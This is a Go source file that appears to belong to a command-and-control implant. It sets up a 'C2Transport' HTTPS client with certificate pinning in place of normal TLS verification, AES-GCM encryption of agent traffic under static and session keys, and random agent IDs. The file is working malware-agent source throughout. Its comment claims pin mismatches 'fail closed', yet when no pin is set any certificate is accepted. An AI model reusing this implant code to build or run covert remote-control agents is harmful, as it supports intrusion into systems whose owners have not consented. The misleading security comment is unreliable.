package common

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
)

// Linker-injected values (set via -ldflags on the common package path).
var StaticKeyHex string // -X .../implant/internal/common.StaticKeyHex=...
var CertPinHex string   // -X .../implant/internal/common.CertPinHex=...

var StaticKey []byte
var SessionKey []byte

var CertPin string
var C2Transport *http.Transport

func init() {
	if StaticKeyHex == "" {
		StaticKey = make([]byte, 32)
		rand.Read(StaticKey)
	} else {
		var err error
		StaticKey, err = hex.DecodeString(StaticKeyHex)
		if err != nil || len(StaticKey) != 32 {
			StaticKey = make([]byte, 32)
			rand.Read(StaticKey)
		}
	}

	if CertPinHex != "" {
		CertPin = CertPinHex
	}

	C2Transport = &http.Transport{
		TLSClientConfig: &tls.Config{
			// Pin-only verification: we don't care about CA chains or the
			// hostname, only that the presented cert matches CertPin.
			// InsecureSkipVerify disables the default chain/hostname checks;
			// the custom VerifyPeerCertificate below still runs and enforces
			// the pin, so a mismatch fails closed.
			InsecureSkipVerify: true,
			VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
				if CertPin == "" {
					return nil
				}
				for _, raw := range rawCerts {
					digest := sha256.Sum256(raw)
					if hex.EncodeToString(digest[:]) == CertPin {
						return nil
					}
				}
				return fmt.Errorf("cert pin mismatch")
			},
		},
	}
}

func GenerateAgentID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func EncryptStatic(text string) (string, error) {
	block, err := aes.NewCipher(StaticKey)
	if err != nil {
		return "", err
	}
	return encryptCommon(text, block)
}

func DecryptStatic(cryptoText string) (string, error) {
	block, err := aes.NewCipher(StaticKey)
	if err != nil {
		return "", err
	}
	return decryptCommon(cryptoText, block)
}

func Encrypt(text string) (string, error) {
	key := StaticKey
	if len(SessionKey) > 0 {
		key = SessionKey
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	return encryptCommon(text, block)
}

func Decrypt(cryptoText string) (string, error) {
	key := StaticKey
	if len(SessionKey) > 0 {
		key = SessionKey
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	return decryptCommon(cryptoText, block)
}

func encryptCommon(text string, block cipher.Block) (string, error) {
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, []byte(text), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decryptCommon(cryptoText string, block cipher.Block) (string, error) {
	data, err := base64.StdEncoding.DecodeString(cryptoText)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return "", fmt.Errorf("too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}
